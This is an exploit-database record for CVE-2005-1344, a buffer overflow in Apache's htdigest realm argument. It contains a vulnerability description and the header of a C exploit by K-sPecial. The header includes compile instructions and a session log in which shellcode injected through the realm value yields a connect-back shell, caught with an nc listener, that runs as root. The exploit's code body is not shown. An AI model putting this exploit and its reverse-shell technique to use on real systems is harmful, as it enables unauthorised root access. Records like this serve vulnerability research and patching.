    "text": "ecve : CVE-2005-1344 ， title : Apache 1.3.x - HTDigest Realm Command Line Argument Buffer Overflow ( 2 ) - Unix remote Exploit ， verified : Verified ， exploit_detail : // source :  ， A buffer overflow vulnerability exists in the htdigest utility included with Apache. The vulnerability is due to improper bounds checking when copying user-supplied realm data into local buffers. ， By supplying an overly long realm value to the command line options of htdigest , it is possible to trigger an overflow condition. This may cause memory to be corrupted with attacker-specified values. ， This issue could be exploited by a remote attacker ; potentially resulting in the execution of arbitrary system commands within the context of the web server process. ， / *  ，  * htdigest-realm-bof.c by K-sPecial 5-11-2005 { irc : //irc.xzziroz.net } ，  * exploit for htdigest 'realm' parameter overflow ; not sure on versions , seems to be <= 1.3.27 <= 2.0.52 ，  * compile with : gcc -o htdigest-realm-bof htdigest-realm-bof.c -std=c99 ，  * One thing to note , apache seems to have htdigest going on quite odd , this code was written ，  * for the version that the htdigest sh script links together , debian seems to install the actual binary ,  ，  * so these might not be compatible. Also to note , this code was tested and created using the htdigest ，  * script/lt-htdigest that comes with apache 2.0.52 ，  * kspecial @ xzziroz : /usr/src/httpd-2.0.52/support $ ./htdigest -c file `./htdigest-realm-bof` user ，  * Adding password for user in realm 111QQQQf11QQhfh9fQSWRf19t11?1?1?11Phn/shh//biPS ，  * 1. ，  * ^ [  [ ?1 ; 2cNew password :  ，  * Re-type new password :  ，  * kspecial @ xzziroz :  ~  $ nc -lvp 1337 ，  * listening on [ any ] 1337 ... ，  * 127.1.1.1 : inverse host lookup failed : Unknown host ，  * connect to [ 127.1.1.1 ] from ( UNKNOWN )  [ 127.1.1.1 ] 2965 ，  * id ，  * uid=1000 ( kspecial ) gid=1000 ( kspecial ) euid=0 ( root ) groups=100 ( users )  , 1000 ( kspecial )  , 1002 ( media )  ，  * Of course the binary is not setuid by default.
